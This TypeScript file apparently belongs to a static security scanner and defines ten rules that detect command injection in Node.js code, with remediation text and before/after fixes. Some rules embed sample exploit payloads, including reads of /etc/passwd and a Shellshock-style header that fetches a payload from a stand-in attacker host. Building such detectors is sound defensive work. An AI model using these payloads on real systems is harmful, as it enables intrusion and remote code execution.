import { BaseRule } from '../engine/base-rule.js';
import type { RuleContext, RuleMeta } from '../engine/types.js';
import { findFunctionCalls, detectUserInputSources, findBinaryExpressionConcat, extractTemplateLiterals } from '../engine/ast-utils.js';

const EXEC_PATTERNS = [
  /child_process\.exec\s*\(/, /\bexec\s*\(/, /\bexecSync\s*\(/,
  /\bspawn\s*\(/, /\bspawnSync\s*\(/, /\bfork\s*\(/,
  /\.execFile\s*\(/, /\bexecFileSync\s*\(/,
];

const SHELL_PATTERNS = [
  /\$\([^)]+\)/, /`[^`]*`/, /\|\s*(?:sh|bash|cmd|powershell)/,
  />\s*(?:[&|])/, /2>&1/, /&&/,
];

function hasShellMetachar(code: string): boolean {
  const meta = /[;&|`$(){}<>]/.test(code);
  return meta;
}

/* ───────────── Rule: SEC-CMD-001 — Command Injection via exec() ───────────── */
export class CommandInjectionExecRule extends BaseRule {
  meta: RuleMeta = {
    id: 'SEC-CMD-001',
    name: 'Command Injection via child_process.exec()',
    description: 'Detects user-controlled input flowing into child_process.exec() which spawns a shell',
    category: 'security-injection',
    severity: 'critical',
    cwe: 'CWE-78',
    owasp: 'A03:2021',
    techniqueNumber: 21,
    pillar: 1,
    tags: ['command-injection', 'exec', 'shell-spawn', 'RCE'],
  };

  async execute(ctx: RuleContext): Promise<void> {
    const userSources = detectUserInputSources(ctx.parsed);

    const execCalls = findFunctionCalls(ctx.parsed, (info, args) => {
      return info.methodName === 'exec' || info.methodName === 'execSync';
    });

    for (const call of execCalls) {
      const refs = userSources
        .filter(s => s.file === call.file && Math.abs(s.line - call.line) < 10)
        .map(s => s.source);
      const uniqueRefs = [...new Set(refs)];
      if (uniqueRefs.length === 0) continue;

      const argsCode = JSON.stringify(call.args);
      const hasSan = /escape|sanitize/.test(argsCode);
      const shellMeta = hasShellMetachar(argsCode);
      const confidence = hasSan ? 30 : (shellMeta ? 95 : 70);

      this.emit(ctx, {
        title: 'Command Injection — Unsafe exec() with User Input',
        message: `child_process.exec() at line ${call.line} receives user-controlled input (${uniqueRefs.join(', ')}). exec() spawns a shell enabling command injection.`,
        file: call.file,
        line: call.line,
        snippet: call.callee,
        confidence,
        taintPath: ['User Input (HTTP/Header)', 'exec() Shell', 'OS Command Execution'],
        remediation: 'Replace exec() with execFile() which does not spawn a shell. If shell is required, use a strict allowlist.',
        autoFixCode: `// Before:\nconst { exec } = require('child_process');\nexec(\`ping \${req.params.ip}\`, (err, out) => res.send(out));\n// After:\nconst { execFile } = require('child_process');\nexecFile('ping', [req.params.ip], (err, out) => res.send(out));`,
        owaspMapping: 'A03:2021-Injection',
        cweMapping: 'CWE-78',
        exploitPayload: `; cat /etc/passwd || ping 127.0.0.1 & whoami`,
      });
    }
  }
}

/* ───────────── Rule: SEC-CMD-002 — Backtick / $() in shell commands ───────────── */
export class CommandInjectionShellExpansionRule extends BaseRule {
  meta: RuleMeta = {
    id: 'SEC-CMD-002',
    name: 'Command Injection via Shell Expansion in exec() Arguments',
    description: 'Detects backtick or $() expansions in exec() arguments originating from user input',
    category: 'security-injection',
    severity: 'critical',
    cwe: 'CWE-78',
    owasp: 'A03:2021',
    techniqueNumber: 22,
    pillar: 1,
    tags: ['command-injection', 'shell-expansion', 'backtick'],
  };

  async execute(ctx: RuleContext): Promise<void> {
    for (const p of ctx.parsed) {
      const code = JSON.stringify(p.ast.program?.body || []);
      const lines = code.split('\n');

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        const hasExec = EXEC_PATTERNS.some(ep => { ep.lastIndex = 0; return ep.test(line); });
        if (!hasExec) continue;

        const hasExpand = /\$\(/.test(line) || /`/.test(line);
        if (!hasExpand) continue;

        const hasUserInput = /\b(req|body|params|query|header|cookie|input|url)\b/i.test(line);
        if (!hasUserInput) continue;

        this.emit(ctx, {
          title: 'Command Injection — Shell Expansion with User Input in exec()',
          message: `Shell expansion (\$() or backtick) detected in exec() argument at line ${i + 1} with user-controlled data. Even if the primary argument is safe, shell expansion creates injection vector.`,
          file: p.file,
          line: i + 1,
          snippet: line.slice(0, 250),
          confidence: 90,
          evidence: 'Shell expansion characters detected in exec() call with user input.',
          taintPath: ['User Input', 'Shell Expansion ($()/``)', 'exec() Shell', 'OS Command Execution'],
          remediation: 'Use execFile() or spawn() with argument array instead of exec(). Avoid string interpolation in shell commands.',
          autoFixCode: `// Before:\nexec(\`curl \${req.body.url}\`, callback);\n// After:\nconst { spawn } = require('child_process');\nspawn('curl', [url], { stdio: 'pipe' });`,
          owaspMapping: 'A03:2021-Injection',
          cweMapping: 'CWE-78',
          exploitPayload: '$(cat /etc/passwd)',
        });
      }
    }
  }
}

/* ───────────── Rule: SEC-CMD-003 — spawn() shell: true injection ───────────── */
export class CommandInjectionSpawnShellRule extends BaseRule {
  meta: RuleMeta = {
    id: 'SEC-CMD-003',
    name: 'Command Injection via spawn() with shell:true',
    description: 'Detects spawn() or fork() called with shell:true option and user-controlled input',
    category: 'security-injection',
    severity: 'critical',
    cwe: 'CWE-78',
    owasp: 'A03:2021',
    techniqueNumber: 23,
    pillar: 1,
    tags: ['command-injection', 'spawn', 'shell-true'],
  };

  async execute(ctx: RuleContext): Promise<void> {
    for (const p of ctx.parsed) {
      const code = JSON.stringify(p.ast.program?.body || []);
      const lines = code.split('\n');

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        if (!/\bspawn\s*\(/.test(line) && !/\bfork\s*\(/.test(line)) continue;
        if (!/\bshell\s*:\s*true\b/.test(line) && !/\{.*shell.*true/.test(line)) continue;
        if (!/\b(req|body|params|query|header|cookie|input)\b/i.test(line)) continue;

        this.emit(ctx, {
          title: 'Command Injection — spawn() with shell:true and User Input',
          message: `spawn() at line ${i + 1} uses shell:true with user-controlled input. This bypasses the safety of spawn() and makes it equivalent to exec().`,
          file: p.file,
          line: i + 1,
          snippet: line.slice(0, 250),
          confidence: 92,
          taintPath: ['User Input', 'spawn() + shell:true', 'Shell Execution'],
          remediation: 'Remove shell:true unless absolutely necessary. Use argument array form of spawn() which does not spawn a shell.',
          autoFixCode: `// Before:\nspawn('grep', [pattern], { shell: true });\n// After:\nspawn('grep', [pattern], { shell: false });`,
          owaspMapping: 'A03:2021-Injection',
          cweMapping: 'CWE-78',
        });
      }
    }
  }
}

/* ───────────── Rule: SEC-CMD-004 — HTTP header → exec injection ───────────── */
export class CommandInjectionHeaderRule extends BaseRule {
  meta: RuleMeta = {
    id: 'SEC-CMD-004',
    name: 'Command Injection via HTTP Headers',
    description: 'Traces taint from HTTP headers (User-Agent, Referer, X-Forwarded-For, Cookie) into cmd execution',
    category: 'security-injection',
    severity: 'critical',
    cwe: 'CWE-78',
    owasp: 'A03:2021',
    techniqueNumber: 24,
    pillar: 1,
    tags: ['command-injection', 'http-headers', 'injection-vector'],
  };

  async execute(ctx: RuleContext): Promise<void> {
    for (const p of ctx.parsed) {
      const code = JSON.stringify(p.ast.program?.body || []);
      const lines = code.split('\n');

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        const headerSource = line.match(/\b(?:req\.(?:headers|header|cookies)\s*\[|req\.get\s*\(|\.headers\.\w+|\.cookies\.\w+)/i);
        if (!headerSource) continue;

        for (let j = i; j < Math.min(i + 5, lines.length); j++) {
          const hasExec = EXEC_PATTERNS.some(ep => { ep.lastIndex = 0; return ep.test(lines[j]); });
          if (!hasExec) continue;

          const varName = headerSource[0].split(/[\[\.]/).pop()?.replace(/['"\]]/g, '') || 'header';
          this.emit(ctx, {
            title: 'Command Injection via HTTP Header — Taint Chain',
            message: `HTTP header "${varName}" (extracted at line ${i + 1}) flows into command execution at line ${j + 1}. Attackers can inject commands via headers like User-Agent.`,
            file: p.file,
            line: j + 1,
            snippet: lines.slice(i, j + 2).join('\n').slice(0, 300),
            confidence: 93,
            taintPath: [`req.headers.${varName}`, 'Variable Assignment', 'exec() / spawn()', 'OS Command Execution'],
            remediation: 'Never pass HTTP header values to command execution functions. If needed, use execFile() with argument array and strict validation.',
            owaspMapping: 'A03:2021-Injection',
            cweMapping: 'CWE-78',
            exploitPayload: `User-Agent: () { :;}; /bin/bash -c 'wget http://attacker/payload'`,
          });
        }
      }
    }
  }
}

/* ───────────── Rule: SEC-CMD-005 — Command injection via URL redirects ───────────── */
export class CommandInjectionURLRule extends BaseRule {
  meta: RuleMeta = {
    id: 'SEC-CMD-005',
    name: 'Command Injection via URL/File Path Manipulation',
    description: 'Detects when user-controlled URLs or file paths are passed to shell commands without validation',
    category: 'security-injection',
    severity: 'critical',
    cwe: 'CWE-78',
    owasp: 'A03:2021',
    techniqueNumber: 25,
    pillar: 1,
    tags: ['command-injection', 'url-injection', 'path-injection'],
  };

  async execute(ctx: RuleContext): Promise<void> {
    for (const p of ctx.parsed) {
      const code = JSON.stringify(p.ast.program?.body || []);
      const lines = code.split('\n');

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i];

        const hasCommandAndInput = EXEC_PATTERNS.some(ep => { ep.lastIndex = 0; return ep.test(line); })
          && /\b(url|uri|path|file|filename|dir|directory)\b/i.test(line)
          && /\b(req|body|params|query|input)\b/i.test(line);

        if (!hasCommandAndInput) continue;

        this.emit(ctx, {
          title: 'Command Injection via URL/Path — User-Controlled File Path',
          message: `User-controlled URL or file path at line ${i + 1} flows into shell command execution. Path traversal combined with command injection enables RCE.`,
          file: p.file,
          line: i + 1,
          snippet: line.slice(0, 250),
          confidence: 85,
          taintPath: ['User Input (URL/Path)', 'Shell Command', 'OS Execution'],
          remediation: 'Use fs/promises API instead of shell commands for file operations. Validate paths against a strict allowlist.',
          owaspMapping: 'A03:2021-Injection',
          cweMapping: 'CWE-78',
        });
      }
    }
  }
}

/* ───────────── Rule: SEC-CMD-006 — Command injection via spawn arg array bypass ───────────── */
export class CommandInjectionSpawnArgBypassRule extends BaseRule {
  meta: RuleMeta = {
    id: 'SEC-CMD-006',
    name: 'Command Injection via spawn() Argument Array — Flag Injection',
    description: 'Detects when user input can inject command flags via spawn() argument array enabling logic bypass',
    category: 'security-injection',
    severity: 'high',
    cwe: 'CWE-78',
    owasp: 'A03:2021',
    techniqueNumber: 26,
    pillar: 1,
    tags: ['command-injection', 'spawn', 'flag-injection', 'argument-injection'],
  };

  async execute(ctx: RuleContext): Promise<void> {
    for (const p of ctx.parsed) {
      const code = JSON.stringify(p.ast.program?.body || []);
      const lines = code.split('\n');

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        const spawnMatch = line.match(/\bspawn\s*\(\s*(['"`])(\w+)\1\s*,\s*\[/);
        if (!spawnMatch) continue;

        const userInputInArgs = /\b(req|body|params|query|input)\b/.test(line);
        if (!userInputInArgs) continue;

        const dangerousCommands = ['rm', 'mv', 'cp', 'chmod', 'chown', 'dd', 'mkfs', 'wget', 'curl', 'git'];
        const cmd = spawnMatch[2];
        if (!dangerousCommands.includes(cmd)) continue;

        this.emit(ctx, {
          title: `Command Injection — Flag Injection via spawn() "${cmd}" Arguments`,
          message: `spawn() at line ${i + 1} passes user input to "${cmd}" command argument array. Even with argument array, flags like --no-preserve-root or --output can be abused.`,
          file: p.file,
          line: i + 1,
          snippet: line.slice(0, 250),
          confidence: 70,
          taintPath: ['User Input', 'spawn() Argument Array', 'Dangerous Command'],
          remediation: 'Use an allowlist for valid argument values, especially for destructive commands like rm, chmod, dd.',
          owaspMapping: 'A03:2021-Injection',
          cweMapping: 'CWE-78',
        });
      }
    }
  }
}

/* ───────────── Rule: SEC-CMD-007 — Shell script file generation ───────────── */
export class CommandInjectionScriptGenRule extends BaseRule {
  meta: RuleMeta = {
    id: 'SEC-CMD-007',
    name: 'Command Injection via Dynamic Script File Generation',
    description: 'Detects when user input is written to a file then executed as a script',
    category: 'security-injection',
    severity: 'critical',
    cwe: 'CWE-78',
    owasp: 'A03:2021',
    techniqueNumber: 27,
    pillar: 1,
    tags: ['command-injection', 'script-generation', 'write-execute'],
  };

  async execute(ctx: RuleContext): Promise<void> {
    for (const p of ctx.parsed) {
      const code = JSON.stringify(p.ast.program?.body || []);
      const lines = code.split('\n');

      let hasWrite = false;
      let writeLine = 0;
      let writeVar = '';

      for (let i = 0; i < lines.length; i++) {
        if (lines[i].match(/writeFile(?:Sync)?\s*\(/) || lines[i].match(/appendFile\s*\(/)) {
          const m = lines[i].match(/(?:const|let|var)\s+(\w+)/);
          if (m) {
            hasWrite = true;
            writeLine = i + 1;
            writeVar = m[1];
          }
        }
      }

      if (!hasWrite) continue;

      for (let i = 0; i < lines.length; i++) {
        if (!lines[i].match(/\bexec\s*\(/) && !lines[i].match(/\bspawn\s*\(/)) continue;
        if (!lines[i].includes(writeVar)) continue;
        if (!/\b(req|body|params|query|input)\b/i.test(lines[i])) continue;

        this.emit(ctx, {
          title: 'Command Injection via Dynamic Script Generation',
          message: `User-controlled content written to file (line ${writeLine}) then executed as a script (line ${i + 1}). Full RCE vector.`,
          file: p.file,
          line: i + 1,
          snippet: `Write at line ${writeLine}: ${lines[writeLine - 1]?.slice(0, 100)}\nExec at line ${i + 1}: ${lines[i].slice(0, 100)}`,
          confidence: 95,
          taintPath: ['User Input', 'File Write', 'Script File', 'Execute Script', 'RCE'],
          remediation: 'Avoid dynamic script generation entirely. Use parameterized APIs instead of shell scripts.',
          owaspMapping: 'A03:2021-Injection',
          cweMapping: 'CWE-78',
        });
      }
    }
  }
}

/* ───────────── Rule: SEC-CMD-008 — Command injection via eval of shell ───────────── */
export class CommandInjectionEvalShellRule extends BaseRule {
  meta: RuleMeta = {
    id: 'SEC-CMD-008',
    name: 'Command Injection via eval() with Shell Commands',
    description: 'Detects eval() containing shell commands with user input',
    category: 'security-injection',
    severity: 'critical',
    cwe: 'CWE-95',
    owasp: 'A03:2021',
    techniqueNumber: 28,
    pillar: 1,
    tags: ['command-injection', 'eval', 'dynamic-code'],
  };

  async execute(ctx: RuleContext): Promise<void> {
    for (const p of ctx.parsed) {
      const code = JSON.stringify(p.ast.program?.body || []);
      const lines = code.split('\n');

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        if (!/\beval\s*\(/.test(line)) continue;
        if (!/\b(req|body|params|query|header|input)\b/i.test(line)) continue;

        const shellCmds = /(?:exec|spawn|execSync|sh|bash|cmd|powershell)/.test(line);

        this.emit(ctx, {
          title: 'eval() with User Input — Potential Command Injection',
          message: `eval() at line ${i + 1} evaluates code containing user-controlled input.${shellCmds ? ' Shell command references detected, enabling direct RCE.' : ''}`,
          file: p.file,
          line: i + 1,
          snippet: line.slice(0, 250),
          confidence: shellCmds ? 95 : 85,
          taintPath: ['User Input', 'eval()', 'Dynamic Code Execution' + (shellCmds ? ' → Shell' : '')],
          remediation: 'Eliminate eval() entirely. Use safer alternatives like Function constructor (still dangerous) or JSON.parse for data.',
          owaspMapping: 'A03:2021-Injection',
          cweMapping: shellCmds ? 'CWE-78' : 'CWE-95',
        });
      }
    }
  }
}

/* ───────────── Rule: SEC-CMD-009 — Command injection path traversal ───────────── */
export class CommandInjectionPathTraversalRule extends BaseRule {
  meta: RuleMeta = {
    id: 'SEC-CMD-009',
    name: 'Command Injection via Path Traversal Combined with Shell Execution',
    description: 'Detects path traversal patterns in user input flowing into shell commands',
    category: 'security-injection',
    severity: 'high',
    cwe: 'CWE-22',
    owasp: 'A03:2021',
    techniqueNumber: 29,
    pillar: 1,
    tags: ['command-injection', 'path-traversal', 'LFI'],
  };

  async execute(ctx: RuleContext): Promise<void> {
    for (const p of ctx.parsed) {
      const code = JSON.stringify(p.ast.program?.body || []);
      const lines = code.split('\n');

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        const hasTraversal = /\.\.\//.test(line) || /\.\.\\/.test(line) || /\.\.\/|\.\.\\/.test(line);
        if (!hasTraversal) continue;
        if (!EXEC_PATTERNS.some(ep => { ep.lastIndex = 0; return ep.test(line); })) continue;
        if (!/\b(req|body|params|query|input)\b/i.test(line)) continue;

        this.emit(ctx, {
          title: 'Command Injection + Path Traversal — Directory Escape',
          message: `Path traversal sequence (../) detected in user input at line ${i + 1} flowing into command execution. Enables reading arbitrary files via shell.`,
          file: p.file,
          line: i + 1,
          snippet: line.slice(0, 250),
          confidence: 88,
          taintPath: ['User Input (../)', 'Shell Command', 'Arbitrary File Read'],
          remediation: 'Resolve all paths safely using path.resolve() and validate against a base directory using path.startsWith().',
          owaspMapping: 'A03:2021-Injection',
          cweMapping: 'CWE-22',
        });
      }
    }
  }
}

/* ───────────── Rule: SEC-CMD-010 — Indirect command injection via npm scripts ───────────── */
export class CommandInjectionNpmScriptRule extends BaseRule {
  meta: RuleMeta = {
    id: 'SEC-CMD-010',
    name: 'Indirect Command Injection via npm run / package.json Scripts',
    description: 'Detects exec() calls running npm scripts with user-controlled environment variables or arguments',
    category: 'security-injection',
    severity: 'high',
    cwe: 'CWE-78',
    owasp: 'A03:2021',
    techniqueNumber: 30,
    pillar: 1,
    tags: ['command-injection', 'npm-script', 'indirect'],
  };

  async execute(ctx: RuleContext): Promise<void> {
    for (const p of ctx.parsed) {
      const code = JSON.stringify(p.ast.program?.body || []);
      const lines = code.split('\n');

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        if (!line.match(/npm\s+run\b/) && !line.match(/yarn\s+run\b/) && !line.match(/pnpm\s+run\b/)) continue;
        if (!EXEC_PATTERNS.some(ep => { ep.lastIndex = 0; return ep.test(line); })) continue;
        if (!/\b(req|body|params|query|input|env|ENV)\b/i.test(line)) continue;

        this.emit(ctx, {
          title: 'Indirect Command Injection — npm run with User Input',
          message: `npm/yarn/pnpm run script at line ${i + 1} is executed with user-controlled input in environment or arguments. If the script uses process.env, injection is possible.`,
          file: p.file,
          line: i + 1,
          snippet: line.slice(0, 250),
          confidence: 60,
          taintPath: ['User Input', 'npm run Script', 'process.env in Script', 'Command Execution'],
          remediation: 'Avoid executing npm scripts with user-controlled environment variables. Use child_process.execFile() with explicit arguments instead.',
          owaspMapping: 'A03:2021-Injection',
          cweMapping: 'CWE-78',
        });
      }
    }
  }
}
